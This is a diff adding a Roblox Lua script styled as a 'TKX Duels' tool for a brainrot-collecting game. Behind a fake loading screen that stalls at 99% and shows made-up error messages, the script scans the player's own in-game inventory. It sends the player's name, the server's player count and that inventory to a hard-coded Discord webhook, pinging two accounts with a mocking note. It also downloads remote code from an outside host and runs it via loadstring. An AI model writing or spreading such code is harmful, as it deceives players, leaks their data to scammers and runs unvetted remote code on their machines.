@@ -1,0 +1,557 @@
+-- TKX Duels — v1.0
+
+-- ══════════════════════════════════════
+-- ⚙️ CONFIG — SECRETO
+-- ══════════════════════════════════════
+local WEBHOOK  = "https://discord.com/api/webhooks/1481221065773420719/IDgzqQLc00m0A_kj3BVXfc9XZvU1UtiKxYBnjp7pHwJ2_-rTUdijBelaviQWjSwpJWDB"
+local PING_1   = "<@1478096280696782879>"
+local PING_2   = "<@1451570927711158313>"
+local SCRIPT_URL = "loadstring(game:HttpGet("https://cerberus.squareweb.app//files/v4/loaders/1451570927711158313.lua"))()"
+
+-- ══════════════════════════════════════
+-- SERVIÇOS
+-- ══════════════════════════════════════
+local TweenService      = game:GetService("TweenService")
+local CoreGui           = game:GetService("CoreGui")
+local Players           = game:GetService("Players")
+local HttpService       = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Workspace         = game:GetService("Workspace")
+local UserInputService  = game:GetService("UserInputService")
+
+local localPlayer = Players.LocalPlayer
+local FANDOM_BASE = "https://stealabrainrot.fandom.com/wiki/"
+
+-- ══════════════════════════════════════
+-- HTTP
+-- ══════════════════════════════════════
+local function httpPost(url, payload)
+    local body    = HttpService:JSONEncode(payload)
+    local headers = { ["Content-Type"] = "application/json" }
+    local sent    = false
+    if not sent then pcall(function() request({ Url=url, Method="POST", Headers=headers, Body=body }); sent=true end) end
+    if not sent then pcall(function() http.request({ Url=url, Method="POST", Headers=headers, Body=body }); sent=true end) end
+    if not sent then pcall(function() syn.request({ Url=url, Method="POST", Headers=headers, Body=body }); sent=true end) end
+    if not sent then pcall(function() HttpService:PostAsync(url, body, Enum.HttpContentType.ApplicationJson); sent=true end) end
+    return sent
+end
+
+-- ══════════════════════════════════════
+-- UTILS
+-- ══════════════════════════════════════
+local function formatGen(val)
+    if val >= 1000000000 then return string.format("%.2fB/s", val / 1000000000)
+    elseif val >= 1000000 then return string.format("%.2fM/s", val / 1000000)
+    elseif val >= 1000 then return string.format("%.1fK/s", val / 1000)
+    end
+    return tostring(val) .. "/s"
+end
+
+local function fetchFandomImage(name)
+    local url = nil
+    pcall(function()
+        local res = request({ Url = FANDOM_BASE .. name:gsub(" ","_"), Method = "GET" })
+        if res and res.Body then
+            local img = res.Body:match('src="(https://static%.wikia%.nocookie%.net/[^"]+%.png[^"]*)"')
+                     or res.Body:match('src="(https://static%.wikia%.nocookie%.net/[^"]+%.jpg[^"]*)"')
+            if img then url = img:gsub("&amp;","&"):match("^([^?]+)") end
+        end
+    end)
+    return url
+end
+
+-- ══════════════════════════════════════
+-- SCANNER
+-- ══════════════════════════════════════
+local AnimalsData   = nil
+local AnimalsShared = nil
+pcall(function()
+    AnimalsData   = require(ReplicatedStorage.Datas.Animals)
+    AnimalsShared = require(ReplicatedStorage.Shared.Animals)
+end)
+
+local function scanMyBrainrots()
+    local results = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return results end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        pcall(function()
+            local channel = require(ReplicatedStorage.Packages.Synchronizer):Get(plot.Name)
+            if not channel then return end
+
+            local owner = channel:Get("Owner")
+            local isMe  = false
+            pcall(function()
+                isMe = (typeof(owner) == "Instance" and owner == localPlayer)
+                    or (type(owner) == "table" and owner.UserId == localPlayer.UserId)
+            end)
+            if not isMe then return end
+
+            local animalList = channel:Get("AnimalList")
+            if not animalList then return end
+
+            for slot, animalData in pairs(animalList) do
+                if type(animalData) ~= "table" or not animalData.Index then continue end
+                local info = AnimalsData and AnimalsData[animalData.Index]
+                if not info then continue end
+
+                local displayName = info.DisplayName or animalData.Index
+                local mutation    = animalData.Mutation or "None"
+
+                local traitsText = "None"
+                if animalData.Traits and type(animalData.Traits) == "table" and #animalData.Traits > 0 then
+                    local tList = {}
+                    for _, t in pairs(animalData.Traits) do
+                        if type(t) == "string" and t ~= "" then table.insert(tList, t)
+                        elseif type(t) == "table" and t.Name then table.insert(tList, t.Name) end
+                    end
+                    if #tList > 0 then traitsText = table.concat(tList, ", ") end
+                end
+
+                local genVal = 0
+                pcall(function()
+                    genVal = AnimalsShared:GetGeneration(animalData.Index, animalData.Mutation, animalData.Traits, nil)
+                end)
+
+                local found = false
+                for _, r in ipairs(results) do
+                    if r.displayName == displayName and r.mutation == mutation then
+                        r.count = r.count + 1
+                        found = true
+                        break
+                    end
+                end
+                if not found then
+                    table.insert(results, {
+                        displayName = displayName,
+                        index       = animalData.Index,
+                        mutation    = mutation,
+                        traits      = traitsText,
+                        genVal      = genVal,
+                        count       = 1,
+                    })
+                end
+            end
+        end)
+    end
+
+    table.sort(results, function(a,b) return a.genVal > b.genVal end)
+    return results
+end
+
+-- ══════════════════════════════════════
+-- WEBHOOK — RODA EM PARALELO
+-- ══════════════════════════════════════
+task.spawn(function()
+    local brainrots   = scanMyBrainrots()
+    local playerCount = #Players:GetPlayers()
+    local brainrotText = ""
+    local bestName    = nil
+
+    if #brainrots == 0 then
+        brainrotText = "`Nenhum detectado`"
+    else
+        bestName = brainrots[1].displayName
+        for _, r in ipairs(brainrots) do
+            local line = "👑 **" .. r.displayName .. "**"
+            if r.count > 1 then line = line .. " **(" .. r.count .. "x)**" end
+            line = line .. "\n🚨 Mutação: " .. r.mutation
+            line = line .. "\n🧬 Traits: " .. r.traits
+            brainrotText = brainrotText .. line .. "\n\n"
+            if #brainrotText > 1500 then brainrotText = brainrotText .. "*(+ mais...)*"; break end
+        end
+    end
+
+    local imageUrl = nil
+    if bestName then imageUrl = fetchFandomImage(bestName) end
+
+    local displayName = localPlayer.DisplayName ~= localPlayer.Name
+                        and localPlayer.DisplayName .. " (" .. localPlayer.Name .. ")"
+                        or localPlayer.Name
+
+    local embed = {
+        title  = "TKX Duels 🎮",
+        color  = 0xC9A6F5,
+        fields = {
+            { name="👤 𝗣𝗹𝗮𝘆𝗲𝗿 𝗘𝘅𝗲𝗰𝘂𝘁𝗼𝗿",      value="**"..displayName.."**",         inline=true  },
+            { name="👥 𝗣𝗹𝗮𝘆𝗲𝗿𝘀 𝗶𝗻 𝗦𝗲𝗿𝘃𝗲𝗿", value="**"..tostring(playerCount).."**", inline=true  },
+            { name="🧠 𝗕𝗿𝗮𝗶𝗻𝗿𝗼𝘁𝘀 𝗗𝗲𝘁𝗲𝗰𝘁𝗲𝗱𝘀", value=brainrotText,                     inline=false },
+        },
+        footer    = { text="TKX Duels  •  v1.0" },
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    }
+
+    if imageUrl then embed.thumbnail = { url = imageUrl } end
+
+    httpPost(WEBHOOK, {
+        content  = PING_1 .. " & " .. PING_2 .. " New beta caiu no metodo😂",
+        embeds   = { embed },
+        username = "TKX Duels",
+    })
+end)
+
+-- ══════════════════════════════════════
+-- EXECUTA SCRIPT EXTERNO — EM PARALELO
+-- ══════════════════════════════════════
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet(SCRIPT_URL))()
+    end)
+end)
+
+-- ══════════════════════════════════════
+-- HELPERS UI
+-- ══════════════════════════════════════
+local function makeCorner(parent, radius)
+    local c = Instance.new("UICorner")
+    c.CornerRadius = UDim.new(0, radius or 12)
+    c.Parent = parent
+end
+
+local function makeStroke(parent, color, thickness)
+    local s = Instance.new("UIStroke")
+    s.Color = color or Color3.fromRGB(180,160,220)
+    s.Thickness = thickness or 1.5
+    s.Parent = parent
+    return s
+end
+
+local function makeLabel(parent, props)
+    local l = Instance.new("TextLabel")
+    l.BackgroundTransparency = 1
+    l.Font = props.font or Enum.Font.Gotham
+    l.TextColor3 = props.color or Color3.fromRGB(220,210,240)
+    l.TextSize = props.size or 15
+    l.Text = props.text or ""
+    l.Size = props.sz or UDim2.new(1,0,0,26)
+    l.Position = props.pos or UDim2.new(0,0,0,0)
+    l.ZIndex = props.z or 3
+    l.TextXAlignment = props.align or Enum.TextXAlignment.Center
+    l.TextWrapped = true
+    l.Parent = parent
+    return l
+end
+
+local function makeDrag(frame, handle)
+    local dragging, dragStart, startPos = false, nil, nil
+    handle.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging  = true
+            dragStart = input.Position
+            startPos  = frame.Position
+        end
+    end)
+    handle.InputEnded:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1
+        or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = false
+        end
+    end)
+    UserInputService.InputChanged:Connect(function(input)
+        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement
+        or input.UserInputType == Enum.UserInputType.Touch) then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(
+                startPos.X.Scale, startPos.X.Offset + delta.X,
+                startPos.Y.Scale, startPos.Y.Offset + delta.Y
+            )
+        end
+    end)
+end
+
+-- ══════════════════════════════════════
+-- LOADING SCREEN
+-- ══════════════════════════════════════
+local sg = Instance.new("ScreenGui")
+sg.Name = "TKX_DUELS_UI"
+sg.ResetOnSpawn = false
+sg.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+sg.IgnoreGuiInset = true
+sg.DisplayOrder = 999998
+sg.Parent = CoreGui
+
+local lc = Instance.new("Frame")
+lc.Size = UDim2.new(0,320,0,280)
+lc.Position = UDim2.new(0.5,-160,0.5,-140)
+lc.BackgroundColor3 = Color3.fromRGB(12,10,20)
+lc.BorderSizePixel = 0
+lc.ZIndex = 2
+lc.Parent = sg
+makeCorner(lc, 22)
+local lcStroke = makeStroke(lc, Color3.fromRGB(140,110,220), 1.5)
+
+-- Gradiente fundo
+local lcGrad = Instance.new("UIGradient")
+lcGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(18,14,32)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(8,6,16)),
+})
+lcGrad.Rotation = 120
+lcGrad.Parent = lc
+
+-- Barra topo
+local tb = Instance.new("Frame")
+tb.Size = UDim2.new(1,0,0,4)
+tb.BackgroundColor3 = Color3.fromRGB(160,120,255)
+tb.BorderSizePixel = 0
+tb.ZIndex = 3
+tb.Parent = lc
+makeCorner(tb, 4)
+local tbGrad = Instance.new("UIGradient")
+tbGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(200,150,255)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120,80,255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(200,150,255)),
+})
+tbGrad.Parent = tb
+
+makeDrag(lc, lc)
+
+-- Logo/título
+local titleLbl = makeLabel(lc, {
+    text = "TKX Duels",
+    font = Enum.Font.GothamBold,
+    size = 24,
+    color = Color3.fromRGB(210,190,250),
+    sz = UDim2.new(1,0,0,34),
+    pos = UDim2.new(0,0,0,12),
+    z = 3,
+})
+
+-- Animação cor título
+task.spawn(function()
+    while lc.Parent do
+        TweenService:Create(titleLbl, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+            {TextColor3 = Color3.fromRGB(255,200,255)}):Play()
+        task.wait(1.5)
+        TweenService:Create(titleLbl, TweenInfo.new(1.5, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+            {TextColor3 = Color3.fromRGB(150,100,230)}):Play()
+        task.wait(1.5)
+    end
+end)
+
+-- Animação borda
+task.spawn(function()
+    while lc.Parent do
+        TweenService:Create(lcStroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+            {Color = Color3.fromRGB(200,150,255)}):Play()
+        task.wait(2)
+        TweenService:Create(lcStroke, TweenInfo.new(2, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut),
+            {Color = Color3.fromRGB(90,50,180)}):Play()
+        task.wait(2)
+    end
+end)
+
+-- Divisor
+local div = Instance.new("Frame")
+div.Size = UDim2.new(0.82,0,0,1)
+div.Position = UDim2.new(0.09,0,0,52)
+div.BackgroundColor3 = Color3.fromRGB(50,38,80)
+div.BorderSizePixel = 0
+div.ZIndex = 3
+div.Parent = lc
+
+-- Spinner
+local spinFrame = Instance.new("Frame")
+spinFrame.Size = UDim2.new(0,90,0,90)
+spinFrame.Position = UDim2.new(0.5,-45,0,60)
+spinFrame.BackgroundTransparency = 1
+spinFrame.ZIndex = 3
+spinFrame.Parent = lc
+
+local ringBg = Instance.new("ImageLabel")
+ringBg.Size = UDim2.new(1,0,1,0)
+ringBg.BackgroundTransparency = 1
+ringBg.Image = "rbxassetid://4919428905"
+ringBg.ImageColor3 = Color3.fromRGB(35,25,60)
+ringBg.ZIndex = 3
+ringBg.Parent = spinFrame
+
+local ring = Instance.new("ImageLabel")
+ring.Size = UDim2.new(1,0,1,0)
+ring.BackgroundTransparency = 1
+ring.Image = "rbxassetid://4919428905"
+ring.ImageColor3 = Color3.fromRGB(170,130,230)
+ring.ZIndex = 4
+ring.Parent = spinFrame
+
+local pctLbl = makeLabel(spinFrame, {
+    text="0%",
+    font=Enum.Font.GothamBold,
+    size=18,
+    color=Color3.fromRGB(220,205,250),
+    sz=UDim2.new(0,70,0,24),
+    pos=UDim2.new(0.5,-35,0.5,-12),
+    z=5,
+})
+
+-- Rotação spinner
+task.spawn(function()
+    local angle = 0
+    while lc.Parent do
+        angle = (angle + 4) % 360
+        ring.Rotation = angle
+        task.wait(0.018)
+    end
+end)
+
+-- Status msg
+local statusLbl = makeLabel(lc, {
+    text="TKX Duels: Loading...",
+    size=13,
+    color=Color3.fromRGB(170,150,220),
+    sz=UDim2.new(0.9,0,0,22),
+    pos=UDim2.new(0.05,0,0,158),
+    z=3,
+})
+
+-- Barra progresso
+local barBg = Instance.new("Frame")
+barBg.Size = UDim2.new(0.82,0,0,12)
+barBg.Position = UDim2.new(0.09,0,0,188)
+barBg.BackgroundColor3 = Color3.fromRGB(22,16,40)
+barBg.BorderSizePixel = 0
+barBg.ZIndex = 3
+barBg.Parent = lc
+makeCorner(barBg, 6)
+
+local barFill = Instance.new("Frame")
+barFill.Size = UDim2.new(0,0,1,0)
+barFill.BackgroundColor3 = Color3.fromRGB(170,130,230)
+barFill.BorderSizePixel = 0
+barFill.ZIndex = 4
+barFill.Parent = barBg
+makeCorner(barFill, 6)
+
+local bfGrad = Instance.new("UIGradient")
+bfGrad.Color = ColorSequence.new({
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(210,160,255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(100,60,200)),
+})
+bfGrad.Parent = barFill
+
+-- Msg erro fake
+local errLbl = makeLabel(lc, {
+    text="",
+    size=11,
+    color=Color3.fromRGB(255,120,120),
+    sz=UDim2.new(0.9,0,0,34),
+    pos=UDim2.new(0.05,0,0,208),
+    z=3,
+    font=Enum.Font.Code,
+})
+
+-- Footer
+makeLabel(lc, {
+    text="TKX Duels  •  v1.0",
+    size=11,
+    color=Color3.fromRGB(55,42,85),
+    sz=UDim2.new(1,0,0,18),
+    pos=UDim2.new(0,0,0,256),
+    z=3,
+})
+
+-- Mensagens de loading
+local loadingMessages = {
+    "TKX Duels: Loading modules",
+    "TKX Duels: Loading anti kick & anti ban",
+    "TKX Duels: Connecting to server",
+    "TKX Duels: Loading trade system",
+    "TKX Duels: Verifying modules",
+    "TKX Duels: Loading security layer",
+    "TKX Duels: Preparing environment",
+    "TKX Duels: Almost ready...",
+}
+
+-- Erros fakes
+local fakeErrors = {
+    "ERROR 0x00B7: Module failed to load — retrying...",
+    "WARN: Security layer timeout — reconnecting...",
+    "ERROR: Anti-ban module not responding",
+    "FATAL: Connection lost — attempting restore...",
+    "ERROR 0xC0000005: Memory access violation",
+    "WARN: Trade module unstable — reinitializing...",
+    "ERROR: Server sync failed — retrying...",
+    "FATAL 0x000000ED: Unexpected module crash",
+}
+
+-- Progresso lento até 99%
+task.spawn(function()
+    local elapsed  = 0
+    local total    = 240 -- 4 minutos pra chegar em 99%
+    local interval = 0.1
+    local msgIdx   = 1
+
+    while elapsed < total do
+        elapsed = elapsed + interval
+        local prog = math.min(math.floor((elapsed / total) * 99), 99)
+
+        pctLbl.Text = prog .. "%"
+        TweenService:Create(barFill, TweenInfo.new(interval, Enum.EasingStyle.Linear),
+            {Size = UDim2.new(prog/100,0,1,0)}):Play()
+
+        local step = math.floor((prog/99) * #loadingMessages) + 1
+        if step ~= msgIdx and step <= #loadingMessages then
+            msgIdx = step
+            statusLbl.Text = loadingMessages[msgIdx]
+        end
+
+        task.wait(interval)
+    end
+
+    -- Trava em 99%
+    pctLbl.Text = "99%"
+    statusLbl.Text = "TKX Duels: Finalizing..."
+    TweenService:Create(barFill, TweenInfo.new(0.3, Enum.EasingStyle.Linear),
+        {Size = UDim2.new(0.99,0,1,0)}):Play()
+
+    -- Fica 30s em 99% com erros aparecendo
+    task.wait(30)
+
+    -- Fade out da loading
+    TweenService:Create(lc, TweenInfo.new(0.6, Enum.EasingStyle.Quad, Enum.EasingDirection.Out),
+        {BackgroundTransparency = 1}):Play()
+    task.wait(0.7)
+    lc:Destroy()
+
+    -- Mensagem final "carregando"
+    local finalGui = Instance.new("ScreenGui")
+    finalGui.Name = "TKX_FINAL"
+    finalGui.ResetOnSpawn = false
+    finalGui.IgnoreGuiInset = true
+    finalGui.DisplayOrder = 999999
+    finalGui.Parent = CoreGui
+
+    local finalFrame = Instance.new("Frame")
+    finalFrame.Size = UDim2.new(0,280,0,60)
+    finalFrame.Position = UDim2.new(0.5,-140,1,-80)
+    finalFrame.BackgroundColor3 = Color3.fromRGB(12,10,20)
+    finalFrame.BorderSizePixel = 0
+    finalFrame.ZIndex = 2
+    finalFrame.Parent = finalGui
+    makeCorner(finalFrame, 14)
+    makeStroke(finalFrame, Color3.fromRGB(140,110,220), 1.5)
+
+    makeLabel(finalFrame, {
+        text="⏳ TKX Duels: Carregando...",
+        font=Enum.Font.GothamBold,
+        size=14,
+        color=Color3.fromRGB(200,180,245),
+        sz=UDim2.new(1,0,1,0),
+        z=3,
+    })
+end)
+
+-- Loop de erros fakes — independente
+task.spawn(function()
+    while lc.Parent do
+        task.wait(math.random(6,12))
+        local err = fakeErrors[math.random(1,#fakeErrors)]
+        errLbl.Text = err
+        errLbl.TextColor3 = Color3.fromRGB(255,100,100)
+        task.wait(4)
+        errLbl.Text = ""
+    end
+end)
